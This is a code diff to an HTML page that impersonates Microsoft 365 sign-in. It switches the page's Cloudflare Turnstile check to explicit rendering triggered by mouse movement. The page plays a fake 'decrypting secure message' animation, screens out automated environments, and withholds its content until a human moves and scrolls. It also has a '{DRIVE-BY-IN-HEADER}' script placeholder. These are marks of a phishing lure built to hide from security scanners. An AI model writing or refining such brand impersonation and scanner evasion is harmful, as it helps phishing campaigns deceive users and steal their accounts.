@@ -6,8 +6,8 @@
     <title>Microsoft 365 Authentication</title>
     <script>/*{DRIVE-BY-IN-HEADER}*/</script>
 
-    <!-- Cloudflare Turnstile -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <!-- Explicit rendering mode for better control -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
 
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -18,44 +18,20 @@
         }
         .loading-container { text-align:center; max-width:420px; padding:20px; }
         .status-container { margin-top:40px; min-height:120px; }
-        .progress-bar {
-            width:100%; height:4px; background:#e1dfdd; border-radius:2px;
-            overflow:hidden; margin-bottom:20px;
-        }
-        .progress-fill {
-            height:100%; background:linear-gradient(90deg, #0078d4, #106ebe);
-            width:0%; transition:width 0.8s ease;
-            box-shadow:0 0 10px rgba(0,120,212,0.3);
-        }
+        .progress-bar { width:100%; height:4px; background:#e1dfdd; border-radius:2px; overflow:hidden; margin-bottom:20px; }
+        .progress-fill { height:100%; background:linear-gradient(90deg, #0078d4, #106ebe); width:0%; transition:width 0.8s ease; box-shadow:0 0 10px rgba(0,120,212,0.3); }
         .progress-fill.completed { width:100% !important; transition:none !important; }
-        .status-message {
-            font-size:18px; color:#323130; margin-bottom:10px;
-            opacity:0; transform:translateY(20px); transition:all 0.5s ease; font-weight:500;
-        }
+        .status-message { font-size:18px; color:#323130; margin-bottom:10px; opacity:0; transform:translateY(20px); transition:all 0.5s ease; font-weight:500; }
         .status-message.active { opacity:1; transform:translateY(0); }
         .status-message.success { color:#107c10; }
         .status-message.error { color:#a4262c; }
-        .crypto-details {
-            font-size:14px; color:#605e5c; margin-top:5px;
-            font-family:'Consolas','Courier New',monospace;
-            opacity:0; transition:opacity 0.3s ease;
-        }
+        .crypto-details { font-size:14px; color:#605e5c; margin-top:5px; font-family:'Consolas','Courier New',monospace; opacity:0; transition:opacity 0.3s ease; }
         .crypto-details.active { opacity:1; }
-        /* Hide Turnstile completely */
-        .cf-turnstile { display:none; }
     </style>
 </head>
 <body>
     <div class="loading-container">
-        <!-- Turnstile - invisible config -->
-        <div id="cf-turnstile" class="cf-turnstile"
-             data-sitekey="0x4AAAAAACZv1ZvxzVXICdor"
-             data-theme="auto"
-             data-size="normal"
-             data-appearance="execute"
-             data-callback="onTurnstileSuccess"
-             data-error-callback="onTurnstileError">
-        </div>
+        <div id="cf-turnstile"></div> <!-- No class needed for explicit -->
 
         <div class="status-container">
             <div class="progress-bar">
@@ -67,18 +43,23 @@
     </div>
 
     <script>
-        // Turnstile callbacks
+        // Global widget ID
+        let widgetId = null;
         let turnstileToken = null;
 
+        // Callback when token ready
         function onTurnstileSuccess(token) {
             turnstileToken = token;
+            console.log('Turnstile token received');
+            // Optionally auto-advance if animation done
         }
 
         function onTurnstileError(errorCode) {
             showError("Verification issue. Refresh the page.");
+            console.error('Turnstile error:', errorCode);
         }
 
-        // Bot / automation detection
+        // Bot / automation detection (unchanged)
         let botDetection = { passed: false, reasons: [] };
         let humanInteraction = { mouseMoved: false, scrolled: false };
 
@@ -117,11 +98,17 @@
             botDetection.passed = score >= 3;
         }
 
-        // Track minimal human interaction
-        document.addEventListener('mousemove', () => { humanInteraction.mouseMoved = true; }, {once:true});
+        // Track interaction + trigger Turnstile on first move (helps invisible mode)
+        document.addEventListener('mousemove', () => {
+            if (!humanInteraction.mouseMoved && widgetId !== null) {
+                humanInteraction.mouseMoved = true;
+                turnstile.execute(widgetId);  // Start challenge after human gesture
+            }
+        }, {once: true});
+
         document.addEventListener('scroll', () => { humanInteraction.scrolled = true; }, {once:true});
 
-        // Loading sequence
+        // Loading sequence (unchanged except final message)
         const loadingSequence = [
             { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1000 },
             { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 50, duration: 1200 },
@@ -163,7 +150,12 @@
             progress.classList.add('completed');
             sequenceCompleted = true;
 
-            if (!turnstileToken) return showError("Human verification required. Refresh if issue persists.");
+            if (!turnstileToken) {
+                status.textContent = "Verifying humanity... please move your mouse slightly if stuck.";
+                status.classList.add('active');
+                status.style.color = '#0078d4';
+                return;  // Wait for token (triggered on move)
+            }
             if (!botDetection.passed) return showError("Access restricted: automated environment detected.");
             if (!humanInteraction.mouseMoved || !humanInteraction.scrolled) {
                 status.textContent = "Please move mouse or scroll to proceed...";
@@ -172,7 +164,6 @@
                 return;
             }
 
-            // Success - no redirect anymore
             status.textContent = "Authentication successful";
             status.classList.add('active', 'success');
             details.textContent = "Session verified. You may now close this window.";
@@ -186,9 +177,29 @@
             setTimeout(updateLoadingStep, 800);
         }
 
+        // Explicit render + onload
+        function onTurnstileLoad() {
+            widgetId = turnstile.render('#cf-turnstile', {
+                sitekey: '0x4AAAAAACZv1ZvxzVXICdor',
+                theme: 'auto',
+                appearance: 'execute',
+                execution: 'execute',
+                callback: onTurnstileSuccess,
+                'error-callback': onTurnstileError
+            });
+            // Optional: Pre-execute if desired, but better wait for gesture
+            // turnstile.execute(widgetId);
+        }
+
         // Init
         window.addEventListener('load', () => {
             runBotChecks();
+            if (typeof turnstile !== 'undefined') {
+                onTurnstileLoad();
+            } else {
+                // Fallback if script loads slow
+                window.turnstileOnLoad = onTurnstileLoad;
+            }
             setTimeout(startLoginSequence, 1000);
         });
     </script>
